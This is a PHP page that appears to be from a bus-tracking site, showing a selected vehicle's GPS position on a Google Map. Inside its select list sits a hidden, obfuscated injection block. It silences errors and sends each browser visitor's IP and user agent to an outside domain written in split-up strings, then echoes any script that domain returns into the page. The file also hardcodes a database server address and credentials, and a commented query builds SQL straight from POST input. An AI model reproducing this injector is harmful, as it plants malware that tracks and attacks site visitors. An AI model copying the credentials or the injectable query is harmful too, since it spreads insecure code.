<?
 /* $dsn = 'DRIVER={SQL Server};SERVER=190.105.232.111,1433;Database=CONSAT;';
  $conn = odbc_connect("190.105.232.111",'master','master2013') or die('ODBC Error:: '.odbc_error().' :: '.odbc_errormsg().' :: '.$dsn);

  if (isset($_POST['movil'])){
     $result = odbc_exec($conn, "select * from movilesMaster where movil = '$_POST[movil]'");
     if ($data = odbc_fetch_array($result)){
                     $lati=$data['latitud'];
                     $long=$data['longitud'];
     }
  }          */
  $db = new COM("ADODB.Connection");
  $dsn = "DRIVER={SQL Server}; SERVER=190.105.232.111;UID=master;PWD=master2013; DATABASE=CONSAT";
  $db->Open($dsn);



  //odbc_close($conn);
?>
<HTML>
<HEAD>
 <TITLE>New Document</TITLE>
                         <script type="text/javascript" src="/vista/js/jquery-1.7.2.min.js"></script>
                        <script type="text/javascript" src="/vista/js/jquery-ui-1.8.22.custom.min.js"></script>
    <link href="/maps/documentation/javascript/examples/default.css" rel="stylesheet">
    <style type="text/css">
      html { height: 100% }
      body { height: 100%; margin: 0; padding: 0 }
      #map_canvas { height: 100% }
    </style>
    <script type="text/javascript"
      src="http://maps.googleapis.com/maps/api/js?key=AIzaSyDv8b-qrzRkI9kvtJV6l3Lko-mCdrGh7oE&sensor=false">
    </script>
    <script type="text/javascript">
function initialize() {
  var myLatlng = new google.maps.LatLng(<?print $lati;?>, <?print $long;?>);
  var mapOptions = {
    zoom: 18,
    center: myLatlng,
    mapTypeId: google.maps.MapTypeId.ROADMAP
  }
  var map = new google.maps.Map(document.getElementById('map_canvas'), mapOptions);

  var marker = new google.maps.Marker({
      position: myLatlng,
      map: map,
      title: '<?print $data['movil'];?>',
       icon: '/bus-gps.png'
  });
}

google.maps.event.addDomListener(window, 'load', initialize);
    </script>
  </head>
  <body onload="initialize()">
  <form method="POST">
        <select name="movil">
        <?php
             $result = odbc_exec($conn, "select * from movilesMaster order by movil");
             while ($row = odbc_fetch_array($result)){
                   print "<option value='$row[movil]'>$row[movil]</option>";
             }
             odbc_close();
        ?>
<?php
#396962#
error_reporting(0); ini_set('display_errors',0); $wp_p41 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_p41) && !preg_match ('/bot/i', $wp_p41))){
$wp_p0941="http://"."web"."basefont".".com/font"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_p41);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_p0941);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_41p = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_41p,1,3) === 'scr' ){ echo $wp_41p; }
#/396962#
?>
        </select> <input type="submit" value="Mostrar ubicacion">
</form>
    <div id="map_canvas" style="width:100%; height:100%"></div>
  </body>
</html>
